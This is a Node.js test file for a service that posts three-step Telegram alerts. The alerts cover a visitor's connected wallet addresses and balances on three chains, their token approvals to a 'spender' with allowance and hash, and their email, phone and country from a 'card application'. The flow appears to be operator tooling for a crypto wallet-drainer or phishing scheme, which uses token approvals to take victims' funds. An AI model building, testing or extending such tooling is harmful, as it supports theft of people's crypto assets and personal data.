const { test, beforeEach } = require("node:test");
const assert = require("node:assert/strict");
const env = require("../config/env");
const { sendTelegramMessage } = require("../services/telegram");
const {
    notifyWalletConnected,
    notifyApprovalStatus,
    notifyCardApplication,
    sanitizeValue,
    buildWalletConnectedMessage,
    buildApprovalStatusMessage,
    buildCardApplicationMessage
} = require("../services/telegramNotifications");
const dedupe = require("../storage/notificationDedupe");

beforeEach(() => {
    dedupe.reset();
    env.TELEGRAM_BOT_TOKEN = "";
    env.TELEGRAM_CHAT_ID = "";
});

test("startup without Telegram config skips sending", async () => {
    const result = await sendTelegramMessage("hello");
    assert.equal(result.skipped, true);
    assert.equal(result.ok, false);
});

test("sendTelegramMessage posts to Telegram and never throws", async () => {
    env.TELEGRAM_BOT_TOKEN = "test-token";
    env.TELEGRAM_CHAT_ID = "123";

    const result = await sendTelegramMessage("hello", {
        fetchImpl: async (url, options) => {
            assert.equal(String(url).includes("test-token"), true);
            assert.equal(JSON.parse(options.body).chat_id, "123");
            assert.equal(JSON.parse(options.body).text.includes("hello"), true);
            return {
                ok: true,
                status: 200,
                json: async () => ({ ok: true })
            };
        }
    });

    assert.equal(result.ok, true);
});

test("Telegram API failure is isolated", async () => {
    env.TELEGRAM_BOT_TOKEN = "test-token";
    env.TELEGRAM_CHAT_ID = "123";

    const result = await sendTelegramMessage("hello", {
        fetchImpl: async () => {
            throw new Error("network down");
        }
    });

    assert.equal(result.ok, false);
    assert.equal(result.reason, "network down");
});

test("message 1 includes all 3 network addresses and balances", () => {
    const message = buildWalletConnectedMessage({
        connectionId: "c1",
        walletName: "Trust Wallet",
        accounts: [
            { address: "Ttronaddr", chainId: "tron:0x2b6653dc", namespace: "tron" },
            { address: "0xbsc", chainId: "eip155:56", namespace: "eip155" },
            { address: "0xeth", chainId: "eip155:1", namespace: "eip155" }
        ],
        balances: [
            { network: "tron", chainId: "tron:0x2b6653dc", native: { balance: "11" }, usdt: { balance: "2" } },
            { network: "bsc", chainId: "eip155:56", native: { balance: "0.01" }, usdt: { balance: "3" } },
            { network: "eth", chainId: "eip155:1", native: { balance: "0.12" }, usdt: { balance: "1.5" } }
        ],
        totalUsd: "100"
    });

    assert.match(message, /1\/3 WALLET CONNECTED/);
    assert.match(message, /TRON \/ TRC-20/);
    assert.match(message, /Ttronaddr/);
    assert.match(message, /BNB Smart Chain \/ BEP-20/);
    assert.match(message, /0xbsc/);
    assert.match(message, /Ethereum \/ ERC-20/);
    assert.match(message, /0xeth/);
    assert.match(message, /0\.12/);
    assert.equal(message.includes("private"), false);
});

test("duplicate wallet-connected notification is suppressed", async () => {
    env.TELEGRAM_BOT_TOKEN = "test-token";
    env.TELEGRAM_CHAT_ID = "123";
    let sent = 0;
    const send = async () => {
        sent += 1;
        return { ok: true };
    };
    const session = {
        connectionId: "dup-1",
        accounts: [{ address: "0x1", chainId: "eip155:1", namespace: "eip155" }]
    };

    await notifyWalletConnected(session, send);
    await notifyWalletConnected(session, send);
    assert.equal(sent, 1);
});

test("unfinished approvals do not send message 2", async () => {
    env.TELEGRAM_BOT_TOKEN = "test-token";
    env.TELEGRAM_CHAT_ID = "123";
    let sent = 0;
    const send = async () => {
        sent += 1;
        return { ok: true };
    };

    await notifyApprovalStatus({ status: "requested", transactionHash: "0x2", connectionId: "c" }, send);
    await notifyApprovalStatus({ status: "verified", connectionId: "c" }, send);
    assert.equal(sent, 0);
});

test("message 2 reports all 3 networks with hash only on the approved chain", async () => {
    env.TELEGRAM_BOT_TOKEN = "test-token";
    env.TELEGRAM_CHAT_ID = "123";
    let sent = 0;
    let text = "";
    const send = async (message) => {
        sent += 1;
        text = message;
        return { ok: true };
    };

    const payment = {
        status: "verified",
        connectionId: "conn-appr",
        transactionHash: "0xhash",
        network: "eth",
        token: "USDT",
        tokenContract: "0xaaa",
        spender: "0xbbb",
        allowance: "1 USDT",
        verifiedAmountRaw: "1000000",
        decimals: 6
    };

    await notifyApprovalStatus(payment, send);
    await notifyApprovalStatus(payment, send);
    assert.equal(sent, 1);
    assert.match(text, /2\/3 APPROVAL STATUS/);
    assert.match(text, /TRON \/ TRC-20/);
    assert.match(text, /BNB Smart Chain \/ BEP-20/);
    assert.match(text, /Ethereum \/ ERC-20/);
    assert.match(text, /0xhash/);
    assert.equal((text.match(/Not approved/g) || []).length >= 2, true);
});

test("message 3 includes form details and all 3 networks", () => {
    const message = buildCardApplicationMessage({
        applicationId: "app-1",
        email: "a@b.c",
        phone: "+1555",
        country: "India",
        submittedAt: "2026-01-01T00:00:00.000Z",
        network: "eth",
        payment: {
            status: "verified",
            transactionHash: "0xhash",
            spender: "0xspender",
            tokenContract: "0xtoken",
            allowance: "1 USDT",
            network: "eth"
        }
    }, {
        accounts: [
            { address: "0xeth", chainId: "eip155:1", namespace: "eip155" },
            { address: "0xbsc", chainId: "eip155:56", namespace: "eip155" }
        ]
    });

    assert.match(message, /3\/3 CARD APPLICATION/);
    assert.match(message, /a@b\.c/);
    assert.match(message, /\+1555/);
    assert.match(message, /India/);
    assert.match(message, /TRON \/ TRC-20/);
    assert.match(message, /BNB Smart Chain \/ BEP-20/);
    assert.match(message, /Ethereum \/ ERC-20/);
    assert.match(message, /0xhash/);
    assert.match(message, /0xspender/);
});

test("card application notifies once and Telegram failure does not throw", async () => {
    env.TELEGRAM_BOT_TOKEN = "test-token";
    env.TELEGRAM_CHAT_ID = "123";
    let sent = 0;
    const send = async () => {
        sent += 1;
        throw new Error("telegram down");
    };

    const first = await notifyCardApplication({
        applicationId: "app-1",
        email: "a@b.c",
        phone: "+1",
        country: "India",
        submittedAt: "2026-01-01T00:00:00.000Z",
        walletAddress: "0xabc",
        network: "eip155:1"
    }, send);

    const second = await notifyCardApplication({
        applicationId: "app-1",
        email: "a@b.c",
        phone: "+1",
        country: "India"
    }, send);

    assert.equal(first.ok, false);
    assert.equal(second.skipped, true);
    assert.equal(sent, 1);
    assert.equal(sanitizeValue("mnemonic phrase here"), "[redacted]");
});
